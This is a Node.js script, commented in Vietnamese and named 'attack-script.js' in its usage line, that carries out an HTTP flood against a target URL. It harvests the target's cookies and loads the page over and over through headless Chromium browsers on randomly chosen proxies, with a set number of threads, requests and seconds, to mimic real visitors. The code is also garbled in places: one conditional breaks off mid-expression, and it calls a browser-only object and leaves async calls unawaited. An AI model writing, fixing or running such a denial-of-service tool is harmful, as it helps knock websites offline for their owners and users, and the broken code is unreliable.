const fs = require('fs');
const { chromium } = require('playwright-extra');
const uaParser = require('ua-parser-js');
const { CookieJar } = require('tough-cookie');
const request = require('request');

// Lấy thông số từ dòng lệnh
const numThreads = parseInt(process.argv[2], 10);
const numRequestsPerThread = parseInt(process.argv[3], 10);
const attackTimeInSeconds = parseInt(process.argv[4], 10);
const proxyListPath = process.argv[5];
const targetUrl = process.argv[6];

// Kiểm tra đối số
if (isNaN(numThreads) || isNaN(numRequestsPerThread) || isNaN(attackTimeInSeconds) || !proxyListPath || !targetUrl) {
  console.log('Usage: node attack-script.js <numThreads> <numRequestsPerThread> <attackTimeInSeconds> <proxyListPath> <targetUrl>');
  process.exit(1);
}

// Đọc danh sách proxy từ file
const proxyList = fs.readFileSync(proxyListPath, 'utf8').split('\n').filter(Boolean);

// Tạo một trình duyệt ẩn danh với tùy chọn proxy ngẫu nhiên
async function createBrowserWithProxy() {
  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
  const browser = await chromium.launch();
  const context = await browser.newContext({
    proxy: { server: proxy },
  });
  return { browser, context };
}

// Tạo user agent ngẫu nhiên
function getRandomUserAgent() {
  const ua = uaParser(navigator.userAgent);
  ua.ua.family = `ProxyBot-${Math.floor(Math.random() * 100)}`;
  return uaParser.stringify(ua);
}

// Gửi yêu cầu HTTP và thu thập cookie
function sendRequestAndCollectCookie(targetUrl, userAgent) {
  const cookieJar = request.jar(new CookieJar());
  request.get({ url: targetUrl, headers: { 'User-Agent': userAgent }, jar: cookieJar }, (error, response, body) => {
    if (!error && response.statusCode === 200) {
      const cookies = cookieJar.getCookiesSync(targetUrl);
      const cookieString = cookies.map(cookie => `${cookie.key}=${cookie.value}`).join('; ');
      console.log(`Collected cookies: ${cookieString}`);
      // Gọi hàm tấn công với cookie và user agent đã thu thập
      attackWithCookieAndUserAgent(cookieString, userAgent);
    }
  });
}

// Hàm thực hiện cuộc tấn công
function attackWithCookieAndUserAgent(cookie, userAgent) {
  let completedRequests = 0;
  const startTime = Date.now();
  let elapsedTime = 0;

  const intervalId = setInterval(() => {
    if (elapsedTime >= attackTimeInSeconds * 1000) {
      clearInterval(intervalId);
      console.log('Attack completed.');
      process.exit();
    }
    const currentTime = Date.now();
    elapsedTime = currentTime - startTime;
    const remainingTime = attackTimeInSeconds * 1000 - elapsedTime;

    if (completedRequests >= numRequestsPerThread * numThreads || remainingTime <= 0) {
      clearInterval(intervalId);
      console.log('Attack completed.');
      process.exit();
    }

    if (completedRequests %
      console.log(`Completed requests: ${completedRequests}/${numRequestsPerThread * numThreads}`);
    }

    createBrowserWithProxy().then(({ browser, context }) => {
      const page = context.newPage();
      context.addCookies([{ name: 'cookie', value: cookie, domain: targetUrl }]);
      page.setUserAgent(userAgent);
      let requestsSent = 0;

      const requestIntervalId = setInterval(() => {
        if (requestsSent >= numRequestsPerThread || elapsedTime >= attackTimeInSeconds * 1000) {
          clearInterval(requestIntervalId);
          page.close();
          context.close();
          browser.close();
        } else {
          page.goto(targetUrl);
          requestsSent++;
          completedRequests++;
        }
      }, 1000);
    });
  });
}

// Gọi hàm bắt đầu thu thập cookie và tấn công
sendRequestAndCollectCookie(targetUrl, getRandomUserAgent());
